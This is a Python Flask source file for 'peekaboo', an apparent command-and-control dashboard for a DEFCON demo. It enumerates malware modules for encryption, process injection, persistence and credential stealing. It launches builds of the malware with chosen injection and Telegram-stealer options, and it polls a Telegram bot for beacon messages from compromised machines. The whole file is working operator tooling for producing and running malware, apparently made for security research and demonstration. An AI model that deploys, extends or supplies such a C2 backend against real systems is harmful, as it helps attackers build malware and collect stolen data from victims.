"""
peekaboo dashboard - simple C2 backend for DEFCON Demo Labs
by @cocomelonc
"""
from __future__ import annotations
import json
import os
import subprocess
import threading
import uuid
from datetime import datetime
from pathlib import Path

from flask import Flask, jsonify, render_template, request

try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

app = Flask(__name__)

BASE_DIR   = Path(__file__).parent.parent
CONFIG_DIR = BASE_DIR / "config"
MALWARE_DIR = BASE_DIR / "malware"
PAYLOADS_DIR = BASE_DIR / "payloads"
LOG_FILE   = Path(__file__).parent / "builds.json"

# in-memory job store  {build_id: {...}}
_builds: dict = {}
_lock = threading.Lock()


# ── helpers ──────────────────────────────────────────────────────────────────

def get_modules() -> dict:
    """Auto-discover available modules by scanning filesystem."""
    def _dirs(p: Path) -> list[str]:
        return sorted(d.name for d in p.iterdir() if d.is_dir()) if p.exists() else []

    def _stems(p: Path, ext: str = "*.c") -> list[str]:
        return sorted(f.stem for f in p.glob(ext)) if p.exists() else []

    return {
        "crypto":      _dirs(MALWARE_DIR / "crypto"),
        "injection":   _dirs(MALWARE_DIR / "injection"),
        "persistence": _stems(MALWARE_DIR / "persistence"),
        "stealer":     _stems(MALWARE_DIR / "stealer"),
        "payloads":    _stems(PAYLOADS_DIR),
    }


def _save_build(build_id: str) -> None:
    logs: list = []
    if LOG_FILE.exists():
        try:
            logs = json.loads(LOG_FILE.read_text())
        except Exception:
            logs = []
    with _lock:
        entry = dict(_builds.get(build_id, {}))
    logs.append(entry)
    LOG_FILE.write_text(json.dumps(logs[-100:], indent=2))


def _run_build(build_id: str, params: dict) -> None:
    with _lock:
        _builds[build_id]["status"] = "running"
        _builds[build_id]["start_time"] = datetime.now().isoformat()

    cmd = [
        "python3", str(BASE_DIR / "peekaboo.py"),
        "-p", params.get("payload", "meow"),
        "-e", params.get("encryption", "speck"),
        "-m", params.get("malware", "injection"),
        "-i", params.get("injection", "virtualallocex"),
        "-s", params.get("stealer", "telegram"),
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, cwd=str(BASE_DIR))
        out = result.stdout + result.stderr
        status = "success" if result.returncode == 0 else "failed"
        rc = result.returncode
    except subprocess.TimeoutExpired:
        out = "Build timed out after 120 seconds."
        status = "timeout"
        rc = -1
    except Exception as exc:
        out = str(exc)
        status = "error"
        rc = -1

    with _lock:
        _builds[build_id].update(output=out, returncode=rc, status=status,
                                  end_time=datetime.now().isoformat())
    _save_build(build_id)


# ── routes ────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html", modules=get_modules())


@app.route("/api/modules")
def api_modules():
    return jsonify(get_modules())


@app.route("/api/build", methods=["POST"])
def api_build():
    params = request.get_json(silent=True) or {}
    build_id = uuid.uuid4().hex[:8]
    with _lock:
        _builds[build_id] = {
            "id": build_id,
            "params": params,
            "status": "queued",
            "output": "",
            "returncode": None,
            "created": datetime.now().isoformat(),
            "start_time": None,
            "end_time": None,
        }
    t = threading.Thread(target=_run_build, args=(build_id, params), daemon=True)
    t.start()
    return jsonify({"build_id": build_id})


@app.route("/api/build/<build_id>")
def api_build_status(build_id: str):
    with _lock:
        job = dict(_builds.get(build_id, {}))
    if not job:
        return jsonify({"error": "not found"}), 404
    return jsonify(job)


@app.route("/api/beacons")
def api_beacons():
    """Poll Telegram bot for incoming beacon messages."""
    if not HAS_REQUESTS:
        return jsonify({"error": "requests library not installed", "messages": []})

    cfg_path = CONFIG_DIR / "telegram_config.json"
    if not cfg_path.exists():
        return jsonify({"error": "telegram_config.json not found", "messages": []})

    try:
        cfg = json.loads(cfg_path.read_text())
        token = cfg.get("bot_token", "")
        if not token or "xxx" in token:
            return jsonify({"error": "telegram not configured (placeholder token)", "messages": []})

        resp = _requests.get(
            f"https://api.telegram.org/bot{token}/getUpdates",
            timeout=6,
        )
        data = resp.json()
        if not data.get("ok"):
            return jsonify({"error": "telegram API returned not-ok", "messages": []})

        messages = []
        for update in data.get("result", [])[-30:]:
            msg = update.get("message", {})
            if msg:
                messages.append({
                    "update_id": update["update_id"],
                    "text":      msg.get("text", ""),
                    "date":      msg.get("date", 0),
                    "from":      msg.get("from", {}).get("username", "unknown"),
                    "chat_id":   msg.get("chat", {}).get("id", ""),
                })
        return jsonify({"messages": list(reversed(messages))})

    except Exception as exc:
        return jsonify({"error": str(exc), "messages": []})


@app.route("/api/logs")
def api_logs():
    if not LOG_FILE.exists():
        return jsonify([])
    try:
        return jsonify(json.loads(LOG_FILE.read_text()))
    except Exception:
        return jsonify([])


@app.route("/api/config/<name>")
def api_config(name: str):
    """Return config file contents (tokens redacted)."""
    safe = {"telegram_config", "github_config", "bitbucket_config", "virustotal_config"}
    if name not in safe:
        return jsonify({"error": "unknown config"}), 400
    path = CONFIG_DIR / f"{name}.json"
    if not path.exists():
        return jsonify({"error": "not found"}), 404
    try:
        data = json.loads(path.read_text())
        # redact secrets for display
        for key in ("bot_token", "github_token", "api_key", "password"):
            if key in data:
                v = str(data[key])
                data[key] = v[:6] + "***" if len(v) > 6 else "***"
        return jsonify(data)
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
